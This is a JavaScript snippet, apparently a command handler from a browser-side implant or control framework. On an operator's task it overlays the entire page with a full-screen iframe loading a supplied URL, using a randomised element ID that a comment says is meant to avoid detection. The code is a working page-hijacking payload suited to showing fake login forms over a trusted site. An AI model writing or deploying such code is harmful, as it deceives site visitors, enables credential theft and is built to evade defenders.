COMMANDS['iframe'] = async function(task) {
    var params = parseParams(task);
    var url = (params && params.url) ? params.url : '';
    if (!url) return 'error: url parameter required';

    // Generate random element ID to avoid detection via known strings
    var overlayId = '_o' + Math.random().toString(36).substring(2, 10);

    // Remove existing overlay if present
    var existing = document.querySelector('[data-oid]');
    if (existing) existing.remove();

    // Create overlay container
    var overlay = document.createElement('div');
    overlay.setAttribute('data-oid', overlayId);
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:#fff;';

    // Create iframe
    var frame = document.createElement('iframe');
    frame.src = url;
    frame.style.cssText = 'width:100%;height:100%;border:none;';
    frame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox');

    overlay.appendChild(frame);
    document.body.appendChild(overlay);

    return 'Overlay active: ' + url;
};
